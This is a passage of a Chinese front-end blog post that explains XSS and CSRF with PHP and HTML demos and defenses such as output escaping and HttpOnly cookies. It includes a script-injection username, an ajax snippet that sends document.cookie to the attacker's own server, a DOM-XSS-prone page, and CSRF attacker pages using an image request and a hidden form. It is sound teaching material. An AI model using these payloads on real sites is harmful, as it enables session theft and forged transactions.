<!DOCTYPE html>
<html lang="zh-cn" itemscope itemtype="http://schema.org/WebPage">
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <title>前端其他问题-来自分享 - Wallis</title>
  

<meta name="renderer" content="webkit" />
<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=yes"/>

<meta name="MobileOptimized" content="width"/>
<meta name="HandheldFriendly" content="true"/>


<meta name="applicable-device" content="pc,mobile">

<meta name="theme-color" content="#f8f5ec" />
<meta name="msapplication-navbutton-color" content="#f8f5ec">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">

<meta name="mobile-web-app-capable" content="yes">

<meta name="author" content="bomir" />
  <meta name="description" content="==1. WEB前端安全那些事儿== 前端攻击都有哪些形式，我该如何防范？ XSS攻击 是什么？ XSS是一种经常出现在web应用中的计算机安全漏洞，它允许" />

  <meta name="keywords" content="Hugo, theme, jane" />






<meta name="generator" content="Hugo 0.85.0" />


<link rel="canonical" href="http://localhost:1313/post/frount-end-others/" />





<link rel="icon" href="/favicon.ico" />











<link rel="stylesheet" href="/sass/jane.min.b3a8813c06e6d785beba22bf8264e174fa2cb3a396b22f9ba24e2c00c18aaf7f.css" integrity="sha256-s6iBPAbm14W&#43;uiK/gmThdPoss6OWsi&#43;bok4sAMGKr38=" media="screen" crossorigin="anonymous">





<meta property="og:title" content="前端其他问题-来自分享" />
<meta property="og:description" content="==1. WEB前端安全那些事儿== 前端攻击都有哪些形式，我该如何防范？ XSS攻击 是什么？ XSS是一种经常出现在web应用中的计算机安全漏洞，它允许" />
<meta property="og:type" content="article" />
<meta property="og:url" content="http://localhost:1313/post/frount-end-others/" /><meta property="article:section" content="post" />
<meta property="article:published_time" content="2018-05-06T17:17:14+00:00" />
<meta property="article:modified_time" content="2018-05-06T17:17:14+00:00" />

<meta itemprop="name" content="前端其他问题-来自分享">
<meta itemprop="description" content="==1. WEB前端安全那些事儿== 前端攻击都有哪些形式，我该如何防范？ XSS攻击 是什么？ XSS是一种经常出现在web应用中的计算机安全漏洞，它允许"><meta itemprop="datePublished" content="2018-05-06T17:17:14+00:00" />
<meta itemprop="dateModified" content="2018-05-06T17:17:14+00:00" />
<meta itemprop="wordCount" content="13405">
<meta itemprop="keywords" content="前端," /><meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="前端其他问题-来自分享"/>
<meta name="twitter:description" content="==1. WEB前端安全那些事儿== 前端攻击都有哪些形式，我该如何防范？ XSS攻击 是什么？ XSS是一种经常出现在web应用中的计算机安全漏洞，它允许"/>

<!--[if lte IE 9]>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
<![endif]-->

<!--[if lt IE 9]>
  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
<![endif]-->




</head>
<body>
  <div id="mobile-navbar" class="mobile-navbar">
  <div class="mobile-header-logo">
    <a href="/" class="logo">秤流沙</a>
  </div>
  <div class="mobile-navbar-icon">
    <span></span>
    <span></span>
    <span></span>
  </div>
</div>
<nav id="mobile-menu" class="mobile-menu slideout-menu">
  <ul class="mobile-menu-list">
    <li class="mobile-menu-item">
        
          
          
            <a class="menu-item-link" href="http://localhost:1313/">首页</a>
          
        
      </li><li class="mobile-menu-item">
        
          
          
            <a class="menu-item-link" href="http://localhost:1313/post/">归档</a>
          
        
      </li><li class="mobile-menu-item">
        
          
          
            <a class="menu-item-link" href="http://localhost:1313/tags/">标签</a>
          
        
      </li><li class="mobile-menu-item">
        
          
          
            <a class="menu-item-link" href="http://localhost:1313/categories/">分类</a>
          
        
      </li><li class="mobile-menu-item">
        
          
          
            <a class="menu-item-link" href="http://localhost:1313/about/">关于我</a>
          
        
      </li><li class="mobile-menu-item">
        
          
          
            <a class="menu-item-link" href="https://github.com/Bicomir" rel="noopener" target="_blank">
              Github
              
              <i class="iconfont">
                <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
  width="18" height="18">
  <path d="M623.36 272.96 473.216 423.04C467.2 429.056 467.072 438.656 472.896 444.416c0 0-6.72-6.656 1.6 1.6C496.064 467.648 528.64 500.224 528.64 500.224 534.464 506.048 544 505.856 550.016 499.904l150.08-150.144 67.328 66.432c9.024 8.96 27.456 4.544 30.4-8.96 19.968-92.608 46.656-227.52 46.656-227.52 6.848-34.496-16.192-56.704-49.92-49.92 0 0-134.656 26.816-227.328 46.784C560.32 178.048 556.352 182.272 554.752 187.136c-3.2 6.208-3.008 14.208 3.776 20.992L623.36 272.96z"></path>
  <path d="M841.152 457.152c-30.528 0-54.784 24.512-54.784 54.656l0 274.752L237.696 786.56 237.696 237.696l206.016 0c6.656 0 10.752 0 13.248 0C487.68 237.696 512 213.184 512 182.848 512 152.32 487.36 128 456.96 128L183.04 128C153.216 128 128 152.576 128 182.848c0 3.136 0.256 6.272 0.768 9.28C128.256 195.136 128 198.272 128 201.408l0 639.488c0 0.064 0 0.192 0 0.256 0 0.128 0 0.192 0 0.32 0 30.528 24.512 54.784 54.784 54.784l646.976 0c6.592 0 9.728 0 11.712 0 28.736 0 52.928-22.976 54.464-51.968C896 843.264 896 842.304 896 841.344l0-20.352L896 561.408 896 512.128C896 481.792 871.424 457.152 841.152 457.152z"></path>
</svg>

              </i>
            </a>
          
        
      </li>
    

    
  </ul>
</nav>


  
    






  <link rel="stylesheet" href="/lib/photoswipe/photoswipe.min.css" />
  <link rel="stylesheet" href="/lib/photoswipe/default-skin/default-skin.min.css" />




<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

<div class="pswp__bg"></div>

<div class="pswp__scroll-wrap">
    
    <div class="pswp__container">
      <div class="pswp__item"></div>
      <div class="pswp__item"></div>
      <div class="pswp__item"></div>
    </div>
    
    <div class="pswp__ui pswp__ui--hidden">
    <div class="pswp__top-bar">
      
      <div class="pswp__counter"></div>
      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
      <button class="pswp__button pswp__button--share" title="Share"></button>
      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
      
      
      <div class="pswp__preloader">
        <div class="pswp__preloader__icn">
          <div class="pswp__preloader__cut">
            <div class="pswp__preloader__donut"></div>
          </div>
        </div>
      </div>
    </div>
    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
      <div class="pswp__share-tooltip"></div>
    </div>
    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
    </button>
    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
    </button>
    <div class="pswp__caption">
      <div class="pswp__caption__center"></div>
    </div>
    </div>
    </div>
</div>

  

  

  

  <header id="header" class="header container">
    <div class="logo-wrapper">
  <a href="/" class="logo">
    
      秤流沙
    
  </a>
</div>

<nav class="site-navbar">
  <ul id="menu" class="menu">
    
    
        <li class="menu-item">
        
          
          
            <a class="menu-item-link" href="http://localhost:1313/">首页</a>
          

        

      </li>
    
        <li class="menu-item">
        
          
          
            <a class="menu-item-link" href="http://localhost:1313/post/">归档</a>
          

        

      </li>
    
        <li class="menu-item">
        
          
          
            <a class="menu-item-link" href="http://localhost:1313/tags/">标签</a>
          

        

      </li>
    
        <li class="menu-item">
        
          
          
            <a class="menu-item-link" href="http://localhost:1313/categories/">分类</a>
          

        

      </li>
    
        <li class="menu-item">
        
          
          
            <a class="menu-item-link" href="http://localhost:1313/about/">关于我</a>
          

        

      </li>
    
        <li class="menu-item">
        
          
          
            <a class="menu-item-link" href="https://github.com/Bicomir" rel="noopener" target="_blank">
              Github
              
              <i class="iconfont">
                <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
  width="18" height="18">
  <path d="M623.36 272.96 473.216 423.04C467.2 429.056 467.072 438.656 472.896 444.416c0 0-6.72-6.656 1.6 1.6C496.064 467.648 528.64 500.224 528.64 500.224 534.464 506.048 544 505.856 550.016 499.904l150.08-150.144 67.328 66.432c9.024 8.96 27.456 4.544 30.4-8.96 19.968-92.608 46.656-227.52 46.656-227.52 6.848-34.496-16.192-56.704-49.92-49.92 0 0-134.656 26.816-227.328 46.784C560.32 178.048 556.352 182.272 554.752 187.136c-3.2 6.208-3.008 14.208 3.776 20.992L623.36 272.96z"></path>
  <path d="M841.152 457.152c-30.528 0-54.784 24.512-54.784 54.656l0 274.752L237.696 786.56 237.696 237.696l206.016 0c6.656 0 10.752 0 13.248 0C487.68 237.696 512 213.184 512 182.848 512 152.32 487.36 128 456.96 128L183.04 128C153.216 128 128 152.576 128 182.848c0 3.136 0.256 6.272 0.768 9.28C128.256 195.136 128 198.272 128 201.408l0 639.488c0 0.064 0 0.192 0 0.256 0 0.128 0 0.192 0 0.32 0 30.528 24.512 54.784 54.784 54.784l646.976 0c6.592 0 9.728 0 11.712 0 28.736 0 52.928-22.976 54.464-51.968C896 843.264 896 842.304 896 841.344l0-20.352L896 561.408 896 512.128C896 481.792 871.424 457.152 841.152 457.152z"></path>
</svg>

              </i>
            </a>
          

        

      </li>
    

    
    

    
  </ul>
</nav>

  </header>

  <div id="mobile-panel">
    <main id="main" class="main bg-llight">
      <div class="content-wrapper">
        <div id="content" class="content container">
          <article class="post bg-white">
    
    <header class="post-header">
      <h1 class="post-title">前端其他问题-来自分享</h1>
      
      <div class="post-meta">
        <time datetime="2018-05-06" class="post-time">
          2018-05-06
        </time>
        <div class="post-category">
            <a href="http://localhost:1313/categories/%E5%89%8D%E7%AB%AF/"> 前端 </a>
            
          </div>
        <span class="more-meta"> 约 13405 字 </span>
          <span class="more-meta"> 预计阅读 27 分钟 </span>

        
        

        
        
      </div>
    </header>

    
    
<div class="post-toc" id="post-toc">
  <h2 class="post-toc-title">文章目录</h2>
  <div class="post-toc-content">
    <nav id="TableOfContents">
  <ul>
    <li><a href="#1-web前端安全那些事儿">==1. WEB前端安全那些事儿==</a></li>
    <li><a href="#前端攻击都有哪些形式我该如何防范">前端攻击都有哪些形式，我该如何防范？</a>
      <ul>
        <li><a href="#xss攻击">XSS攻击</a></li>
        <li><a href="#csrf攻击">CSRF攻击</a></li>
        <li><a href="#网络劫持攻击">网络劫持攻击</a></li>
        <li><a href="#控制台注入代码">控制台注入代码</a></li>
        <li><a href="#我们平时开发要注意些什么">我们平时开发要注意些什么？</a></li>
      </ul>
    </li>
    <li><a href="#2-跨域">==2. 跨域==</a>
      <ul>
        <li><a href="#jsonp">jsonp</a></li>
        <li><a href="#动态创建script标签">动态创建script标签</a></li>
        <li><a href="#access-control">Access Control</a></li>
        <li><a href="#windowname">window.name</a></li>
        <li><a href="#服务器代理">服务器代理</a></li>
        <li><a href="#documentdomain两个iframe之间">document.domain（两个iframe之间）</a></li>
        <li><a href="#locationhash两个iframe之间又称fimfragment-identitier-messaging的简写">location.hash（两个iframe之间），又称FIM，Fragment Identitier Messaging的简写</a></li>
        <li><a href="#使用html5的postmessage方法两个iframe之间或者两个页面之间">使用HTML5的postMessage方法（两个iframe之间或者两个页面之间）</a></li>
      </ul>
    </li>
    <li><a href="#3一次完整的http事务是怎样的一个过程">==3.一次完整的HTTP事务是怎样的一个过程？==</a></li>
    <li><a href="#4-排序算法">==4. 排序算法==</a>
      <ul>
        <li><a href="#冒泡排序">冒泡排序</a></li>
        <li><a href="#选择排序">选择排序</a></li>
        <li><a href="#插入排序">插入排序</a></li>
        <li><a href="#希尔排序">希尔排序</a></li>
        <li><a href="#归并排序">归并排序</a></li>
        <li><a href="#快速排序">快速排序</a></li>
        <li><a href="#堆排序">堆排序</a></li>
      </ul>
    </li>
    <li><a href="#5-函数式编程">==5. 函数式编程==</a></li>
    <li><a href="#6-函数式编程柯里化curry">==6. 函数式编程——柯里化（curry）==</a></li>
    <li><a href="#7-redux理解">==7. redux理解==</a></li>
    <li><a href="#8-虚拟dom">==8. 虚拟dom==</a>
      <ul>
        <li><a href="#1-对前端应用状态管理的思考">1 对前端应用状态管理的思考</a></li>
        <li><a href="#2-virtual-dom算法">2. Virtual DOM算法</a></li>
        <li><a href="#3-算法实现">3. 算法实现</a></li>
      </ul>
    </li>
  </ul>
</nav>
  </div>
</div>

    
    <div class="post-content">
      <h2 id="1-web前端安全那些事儿">==1. WEB前端安全那些事儿==</h2>
<h2 id="前端攻击都有哪些形式我该如何防范">前端攻击都有哪些形式，我该如何防范？</h2>
<h3 id="xss攻击">XSS攻击</h3>
<h4 id="是什么">是什么？</h4>
<p>XSS是一种经常出现在web应用中的计算机安全漏洞，它允许恶意web用户将代码植入到提供给其它用户使用的页面中。举个例子，我们有个社交网站，允许大家相互访问空间，网站可能是这样做的：其实在web前端方面，可以简单的理解为一种javascript代码注入。
​</p>
<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#000;font-weight:bold">&lt;?</span>php
    <span style="color:#008080">$username</span><span style="color:#000;font-weight:bold">=</span><span style="color:#d14">&#34;侯医生&#34;</span>;
<span style="color:#999;font-weight:bold;font-style:italic">?&gt;</span><span style="color:#a61717;background-color:#e3d2d2">
</span><span style="color:#a61717;background-color:#e3d2d2">&lt;!DOCYTPE HTML&gt;
</span><span style="color:#a61717;background-color:#e3d2d2">&lt;html&gt;
</span><span style="color:#a61717;background-color:#e3d2d2">    &lt;head&gt;
</span><span style="color:#a61717;background-color:#e3d2d2">        &lt;meta charset=&#34;utf-8&#34; /&gt;
</span><span style="color:#a61717;background-color:#e3d2d2">    &lt;/head&gt;
</span><span style="color:#a61717;background-color:#e3d2d2">    &lt;body&gt;
</span><span style="color:#a61717;background-color:#e3d2d2">        &lt;div&gt;
</span><span style="color:#a61717;background-color:#e3d2d2">            用户名：&lt;?php echo $username;?&gt;
</span><span style="color:#a61717;background-color:#e3d2d2">        &lt;/div&gt;
</span><span style="color:#a61717;background-color:#e3d2d2">        &lt;div&gt;
</span><span style="color:#a61717;background-color:#e3d2d2">            第一条状态：侯医生的状态1
</span><span style="color:#a61717;background-color:#e3d2d2">        &lt;/div&gt;
</span><span style="color:#a61717;background-color:#e3d2d2">        &lt;div&gt;
</span><span style="color:#a61717;background-color:#e3d2d2">            第二条状态：侯医生的状态2
</span><span style="color:#a61717;background-color:#e3d2d2">        &lt;/div&gt;
</span><span style="color:#a61717;background-color:#e3d2d2">        &lt;div&gt;
</span><span style="color:#a61717;background-color:#e3d2d2">            第三条状态：侯医生的状态3
</span><span style="color:#a61717;background-color:#e3d2d2">        &lt;/div&gt;
</span><span style="color:#a61717;background-color:#e3d2d2">    &lt;/body&gt;
</span><span style="color:#a61717;background-color:#e3d2d2">&lt;/html&gt;
</span></code></pre></td></tr></table>
</div>
</div><p>运行时，展现形式如图所示：</p>
<p><img src="https://segmentfault.com/img/bVB9cO" alt="image"></p>
<p>但是，如果你的用户名，起名称的时候，带上script标签呢？我们知道，浏览器遇到html中的script标签的时候，会解析并执行标签中的js脚本代码，那么如果你的用户名称里面含有script标签的话，就可以执行其中的代码了。代码如下，效果如图</p>
<pre><code>&lt;?php
    $username=&quot;&lt;script&gt;alert('侯医生');&lt;/script&gt;&quot;;
?&gt;
</code></pre><p><img src="https://segmentfault.com/img/bVB9or" alt="image"></p>
<p>如果你将自己的用户名设定为这种执行脚本的方式，再让别人去访问你的连接的话，就可以达到在他人web环境中，执行自己脚本的效果了。我们还可以使用ajax，将其他用户在当前域名下的cookie获取并发送到自己的服务器上。这样就可以获取他人信息了。比如，刚刚咱们使用的不是alert而是，如下的代码：</p>
<pre><code>$.ajax({
    url: '自己的服务器',
    dataType: 'jsonp',
    data: {'盗取的用户cookie': document.cookie}
});
</code></pre><h4 id="如何防范">如何防范</h4>
<p>目前来讲，最简单的办法防治办法，还是将前端输出数据都进行转义最为稳妥。比如，按照刚刚我们那个例子来说，其本质是，浏览器遇到script标签的话，则会执行其中的脚本。但是如果我们将script标签的进行转义，则浏览器便不会认为其是一个标签，但是显示的时候，还是会按照正常的方式去显示，代码如下，效果如图</p>
<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#000;font-weight:bold">&lt;?</span>php
    <span style="color:#008080">$username</span><span style="color:#000;font-weight:bold">=</span><span style="color:#d14">&#34;&lt;script&gt;alert(&#39;侯医生&#39;);&lt;/script&gt;&#34;</span>;
<span style="color:#999;font-weight:bold;font-style:italic">?&gt;</span><span style="color:#a61717;background-color:#e3d2d2">
</span><span style="color:#a61717;background-color:#e3d2d2">&lt;!DOCYTPE HTML&gt;
</span><span style="color:#a61717;background-color:#e3d2d2">&lt;html&gt;
</span><span style="color:#a61717;background-color:#e3d2d2">    &lt;head&gt;
</span><span style="color:#a61717;background-color:#e3d2d2">        &lt;meta charset=&#34;utf-8&#34; /&gt;
</span><span style="color:#a61717;background-color:#e3d2d2">    &lt;/head&gt;
</span><span style="color:#a61717;background-color:#e3d2d2">    &lt;body&gt;
</span><span style="color:#a61717;background-color:#e3d2d2">        &lt;!--我们将输出的后端变量，转义之后再输出，则可以避免被注入代码--&gt;
</span><span style="color:#a61717;background-color:#e3d2d2">        &lt;div&gt;
</span><span style="color:#a61717;background-color:#e3d2d2">            用户名：&lt;?php echo htmlentities($username);?&gt;
</span><span style="color:#a61717;background-color:#e3d2d2">        &lt;/div&gt;
</span><span style="color:#a61717;background-color:#e3d2d2">        &lt;div&gt;
</span><span style="color:#a61717;background-color:#e3d2d2">            第一条状态：侯医生的状态1
</span><span style="color:#a61717;background-color:#e3d2d2">        &lt;/div&gt;
</span><span style="color:#a61717;background-color:#e3d2d2">        &lt;div&gt;
</span><span style="color:#a61717;background-color:#e3d2d2">            第二条状态：侯医生的状态2
</span><span style="color:#a61717;background-color:#e3d2d2">        &lt;/div&gt;
</span><span style="color:#a61717;background-color:#e3d2d2">        &lt;div&gt;
</span><span style="color:#a61717;background-color:#e3d2d2">            第三条状态：侯医生的状态3
</span><span style="color:#a61717;background-color:#e3d2d2">        &lt;/div&gt;
</span><span style="color:#a61717;background-color:#e3d2d2">    &lt;/body&gt;
</span><span style="color:#a61717;background-color:#e3d2d2">&lt;/html&gt;
</span></code></pre></td></tr></table>
</div>
</div><p><img src="https://segmentfault.com/img/bVB9qd" alt="image"></p>
<p>其实，我们再来看看网页源码，如图1.2.2</p>
<p><img src="https://segmentfault.com/img/bVB9qG" alt="image">
虽然显示出来是有script标签的，但是实际上，script标签的左右尖括号(&gt;&lt;)，均被转义为html字符实体，所以，便不会被当做标签来解析的，但是实际显示的时候，这两个尖括号，还是可以正常展示的。</p>
<h4 id="升级防御">升级防御</h4>
<p>我们将输出的字符串中的\反斜杠进行转义(json转义)。这样，\就不会被当做unicode码的开头来被处理了。代码如下：</p>
<pre><code>document.getElementById('username_info').innerHTML = &lt;?php echo json_encode(htmlentities($username));?&gt;;
</code></pre><p>都说了道高一尺魔高一丈了，你以为防得住后端输出，黑客大大们就没办法攻击了吗。我们有的时候，会有一些习惯，拿URL上的get参数去构建网页。好比说，直接拿url上的用户名去展示啦，拿url上的一些回跳地址之类的。但是url上的参数，我们是无法提前对其进行转义的。接下来，来个例子，代码如下：</p>
<pre><code>&lt;html&gt;
    &lt;head&gt;
        &lt;meta charset=&quot;utf-8&quot; /&gt;
        &lt;script src=&quot;https://ss0.bdstatic.com/5aV1bjqh_Q23odCf/static/superman/js/lib/jquery-1.10.2_d88366fd.js&quot;&gt;&lt;/script&gt;
    &lt;/head&gt;
    &lt;body&gt;
        &lt;div&gt;
            用户名：&lt;?php echo htmlentities($username);?&gt;
        &lt;/div&gt;
        &lt;div&gt;
            第一条状态：侯医生的状态1
        &lt;/div&gt;
        &lt;div&gt;
            第二条状态：侯医生的状态2
        &lt;/div&gt;
        &lt;div&gt;
            第三条状态：侯医生的状态3
        &lt;/div&gt;
        &lt;div&gt;版权所有：&lt;span id=&quot;username_info&quot;&gt;&lt;/span&gt;&lt;/div&gt;
        &lt;script&gt;
            var param = /=(.+)$/.exec(location.search);
            var value = decodeURIComponent(param[1]);
            $('#username_info').append(value);
        &lt;/script&gt;
    &lt;/body&gt;
&lt;/html&gt;
</code></pre><p>上述代码，满足了一个很正常的需求，解开URL中的一个参数，并将其渲染至页面上。但是，这里面存在一个风险，如果黑客在URL的这个参数中，加入js代码，这样便又会被执行。</p>
<p><img src="https://segmentfault.com/img/bVB9zm" alt="image"></p>
<p>像这种从url中获取的信息，笔者建议，最好由后端获取，在前端转义后再行输出，代码如下，效果如图</p>
<pre><code>&lt;script&gt;
    var value = decodeURIComponent(&quot;&lt;?php echo htmlentities($_GET['username']);?&gt;&quot;);
    $('#username_info').append(value);
&lt;/script&gt;
</code></pre><p><img src="https://segmentfault.com/img/bVB9zP" alt="image"></p>
<p>如果不幸中招了，黑客的js真的在我们的网页上执行了，我们该怎么办。其实，很多时候，我们的敏感信息都是存储在cookie中的（不要把用户机密信息放在网页中），想要阻止黑客通过js访问到cookie中的用户敏感信息。那么请使用cookie的HttpOnly属性，加上了这个属性的cookie字段，js是无法进行读写的。php的设置方法如下：</p>
<pre><code>&lt;?php
    setcookie(&quot;userpass&quot;, &quot;doctorhou-shuai&quot;, NULL, NULL, NULL, NULL, TRUE);
?&gt;
</code></pre><p>如图，我们的cookie已经种上了，并且有了httpOnly标识
<img src="https://segmentfault.com/img/bVB9Hh" alt="image">
我们通过js无法获取cookie中的设定有httpOnly的字段：
<img src="https://segmentfault.com/img/bVB9Hv" alt="image"></p>
<h3 id="csrf攻击">CSRF攻击</h3>
<p>CSRF攻击在百度百科中的解释是：
CSRF（Cross-site request forgery跨站请求伪造，也被称为“One Click Attack”或者Session Riding，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。
其实就是网站中的一些提交行为，被黑客利用，你在访问黑客的网站的时候，进行的操作，会被操作到其他网站上(如：你所使用的网络银行的网站)。</p>
<h4 id="如何攻击">如何攻击？</h4>
<h5 id="要合理使用post与get">要合理使用post与get</h5>
<p>通常我们会为了省事儿，把一些应当提交的数据，做成get请求。殊不知，这不仅仅是违反了http的标准而已，也同样会被黑客所利用。比如，你开发的网站中，有一个购买商品的操作。你是这么开发的：</p>
<pre><code>&lt;?php
// 从cookie中获取用户名，看似稳妥
$username = $_COOKIE['username'];
$productId = $_GET['pid'];
// 这里进行购买操作
//store_into_database($username, $productId);
?&gt;
&lt;meta charset=&quot;utf-8&quot; /&gt;
&lt;?php
echo $username . '买入商品：' . $productId;
?&gt;
</code></pre><p>而商品ID图个省事儿，就使用了url中的get参数。买商品的话，如图</p>
<p><img src="https://segmentfault.com/img/bVB9Ca" alt="image"></p>
<p>那么，黑客的网站可以这样开发：</p>
<!-- raw HTML omitted -->
<pre><code>&lt;html&gt;
    &lt;head&gt;
        &lt;meta charset=&quot;utf-8&quot; /&gt;
    &lt;/head&gt;
    &lt;body&gt;
        &lt;img src=&quot;http://localhost:8082/lab/xsrflab/submit.php?pid=1&quot; /&gt;
    &lt;/body&gt;
&lt;/html&gt;
</code></pre><p>这样的话，用户只需要访问一次黑客的网站，其实就相当于在你的网站中，操作了一次。然而用户却没有感知。</p>
<p>如果你使用了post请求来处理关键业务的，还是有办法可以破解的。我们的业务代码如下：</p>
<pre><code>&lt;?php
$username = $_COOKIE['username'];
// 换为post了，可以规避黑客直接的提交
$productId = $_POST['pid'];
// 这里进行购买操作
//store_into_database($username, $productId);
?&gt;
&lt;meta charset=&quot;utf-8&quot; /&gt;
&lt;?php
echo $username . '买入商品：' . $productId;
?&gt;
</code></pre><p>黑客代码如下：</p>
<pre><code>&lt;!DOCYTPE HTML&gt;
&lt;html&gt;
    &lt;head&gt;
        &lt;meta charset=&quot;utf-8&quot; /&gt;
        &lt;script src=&quot;https://ss0.bdstatic.com/5aV1bjqh_Q23odCf/static/superman/js/lib/jquery-1.10.2_d88366fd.js&quot;&gt;&lt;/script&gt;
    &lt;/head&gt;
    &lt;body&gt;
        &lt;button id=&quot;clickme&quot;&gt;点我看相册&lt;/button&gt;
        &lt;script&gt;
            $('#clickme').on('click', function () {
                // 用户再不知情的情况下，提交了表单，服务器这边也会以为是用户提交过来的。
                $('#myform').submit();
            });
        &lt;/script&gt;
        &lt;form id=&quot;myform&quot; style=&quot;display:none;&quot; target=&quot;myformer&quot; method=&quot;post&quot; action=&quot;http://myhost:8082/lab/xsrflab/submit.php&quot;&gt;
